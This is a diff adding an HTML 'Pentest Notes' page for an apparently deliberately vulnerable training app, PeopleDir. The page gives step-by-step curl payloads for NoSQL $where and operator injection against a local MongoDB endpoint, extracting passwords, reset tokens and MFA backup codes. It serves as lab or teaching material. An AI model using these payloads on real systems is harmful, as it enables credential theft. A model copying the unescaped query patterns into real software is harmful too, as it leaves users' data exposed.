@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>{{.Title}}</title>
+  <link rel="stylesheet" href="/static/style.css">
+</head>
+<body>
+<header>
+  <a class="logo" href="/"><span class="logo-dot"></span>People<span>Dir</span></a>
+  <nav>
+    <a href="/lookup">Find Employee</a>
+    <a href="/docs" class="active">Security Notes</a>
+  </nav>
+</header>
+
+<main>
+  <div class="docs-wrap">
+    <h1>Pentest Notes – PeopleDir</h1>
+    <p class="docs-intro">Exploitation reference. App2 – VULN-C and VULN-D (NoSQL injection, MongoDB).</p>
+
+    <div class="vuln-card">
+      <div class="vuln-header">
+        <span class="vuln-id">VULN-C</span>
+        <span class="vuln-type">NoSQL Injection – Boolean-Based Data Extraction</span>
+      </div>
+      <p><strong>Endpoint:</strong> <code>GET /api/lookup?user=&lt;value&gt;</code> (JSON) or <code>GET /lookup?user=&lt;value&gt;</code> (HTML)</p>
+      <p><strong>Mechanism:</strong> The <code>user</code> parameter is interpolated into a <code>$where</code> JavaScript expression. By injecting a conditional JS regex, the attacker can test hidden field values character by character. The boolean oracle is the HTTP status code: <strong>200</strong> = condition true | <strong>404</strong> = condition false.</p>
+      <p><strong>Step 1 – Confirm injection point:</strong></p>
+      <pre><code># Always-true condition → returns profile (200)
+curl -s -o/dev/null -w "%{http_code}" \
+  "http://localhost:8082/api/lookup?user=jdoe'+||+'1'=='1"
+
+# Always-false condition → not found (404)
+curl -s -o/dev/null -w "%{http_code}" \
+  "http://localhost:8082/api/lookup?user=jdoe'+||+'1'=='2"</code></pre>
+      <p><strong>Step 2 – Discover hidden fields:</strong></p>
+      <pre><code># Test if 'resetToken' field exists in the document
+curl -s -o/dev/null -w "%{http_code}" \
+  "http://localhost:8082/api/lookup?user=jdoe'+%26%26+this.hasOwnProperty('resetToken')+||+'x'%3D%3D'y"
+# Decoded: jdoe' && this.hasOwnProperty('resetToken') || 'x'=='y
+
+# Test if 'password' field exists
+curl -s -o/dev/null -w "%{http_code}" \
+  "http://localhost:8082/api/lookup?user=jdoe'+%26%26+this.hasOwnProperty('password')+||+'x'%3D%3D'y"</code></pre>
+      <p><strong>Step 3 – Extract field value character by character:</strong></p>
+      <pre><code># Is the first character of jdoe's password 'P'? (200=yes, 404=no)
+curl -s -o/dev/null -w "%{http_code}" \
+  "http://localhost:8082/api/lookup?user=jdoe'+%26%26+this.password.match(%2F%5EP.*%2F)+||+'x'%3D%3D'y"
+# Decoded: jdoe' && this.password.match(/^P.*/) || 'x'=='y
+
+# Extend the pattern as chars are found
+# jdoe' && this.password.match(/^Pa.*/) || 'x'=='y
+# jdoe' && this.password.match(/^Pa5.*/) || 'x'=='y  ... etc.
+
+# Extract resetToken of 'admin'
+# admin' && this.resetToken.match(/^reset_.*/) || 'x'=='y
+curl -s -o/dev/null -w "%{http_code}" \
+  "http://localhost:8082/api/lookup?user=admin'+%26%26+this.resetToken.match(%2F%5Ereset_.*%2F)+||+'x'%3D%3D'y"</code></pre>
+      <p><strong>Why it works:</strong> <code>fmt.Sprintf</code> interpolates the username into a <code>$where</code> JS expression without escaping. Injecting a single quote closes the username string, allowing arbitrary JS to be appended. The response (200 vs 404) leaks one bit per request.</p>
+    </div>
+
+    <div class="vuln-card">
+      <div class="vuln-header">
+        <span class="vuln-id">VULN-D</span>
+        <span class="vuln-type">NoSQL Operator Injection – Extract Unknown Fields</span>
+      </div>
+      <p><strong>Endpoint:</strong> <code>GET /api/employee?id=&lt;value&gt;</code></p>
+      <p><strong>Mechanism:</strong> The <code>id</code> parameter is parsed as JSON if it starts with <code>{</code>. A JSON object like <code>{"$regex":"^adm"}</code> becomes a BSON operator, letting the attacker find arbitrary documents. The handler returns the raw <code>bson.M</code> document — exposing ALL fields, including those the UI never shows (<code>password</code>, <code>resetToken</code>, <code>secretKey</code>, <code>mfaBackupCode</code>, <code>adminLevel</code>).</p>
+      <p><strong>Step 1 – Access known user and see all fields:</strong></p>
+      <pre><code># Direct username lookup — returns full document with hidden fields
+curl -s "http://localhost:8082/api/employee?id=admin" | python3 -m json.tool
+# Response includes: name, role, skills, bio AND password, resetToken, secretKey...</code></pre>
+      <p><strong>Step 2 – Operator injection to find unknown usernames:</strong></p>
+      <pre><code># Regex: find username starting with "adm"
+curl -s 'http://localhost:8082/api/employee?id={"$regex":"^adm"}' | python3 -m json.tool
+
+# $ne: find any user (returns first document)
+curl -s 'http://localhost:8082/api/employee?id={"$ne":"nonexistent"}' | python3 -m json.tool
+
+# $in: try common admin usernames
+curl -s 'http://localhost:8082/api/employee?id={"$in":["admin","administrator","root","sysadmin"]}' | python3 -m json.tool</code></pre>
+      <p><strong>Step 3 – Find users with specific hidden fields:</strong></p>
+      <pre><code># Find a user who has a 'secretKey' field
+curl -s 'http://localhost:8082/api/employee?id={"$where":"this.hasOwnProperty('"'"'secretKey'"'"')"}' | python3 -m json.tool
+
+# All employees with adminLevel > 3
+curl -s 'http://localhost:8082/api/employee?id={"$where":"this.adminLevel > 3"}' | python3 -m json.tool</code></pre>
+      <p><strong>Why it works:</strong> <code>json.Unmarshal</code> converts a JSON operator object into <code>map[string]interface{}</code>. When placed in <code>bson.D</code>, the mongo-driver executes it as a BSON operator. The handler uses <code>bson.M</code> (which decodes all fields) and calls <code>json.NewEncoder(w).Encode(doc)</code> without field filtering — exposing every attribute stored in MongoDB.</p>
+    </div>
+
+    <div class="info-box">
+      <strong>Database:</strong> app2_db &nbsp;|&nbsp;
+      <strong>Collection:</strong> employees &nbsp;|&nbsp;
+      <strong>Public fields:</strong> name, username, department, role, bio, skills &nbsp;|&nbsp;
+      <strong>Hidden fields:</strong> password, resetToken, secretKey, adminLevel, mfaBackupCode, bonusAmount
+    </div>
+  </div>
+</main>
+
+<footer>
+  <p>© 2024 PeopleDir &nbsp;|&nbsp; <a href="/docs">Security Notes</a></p>
+</footer>
+<script src="/static/script.js"></script>
+</body>
+</html>
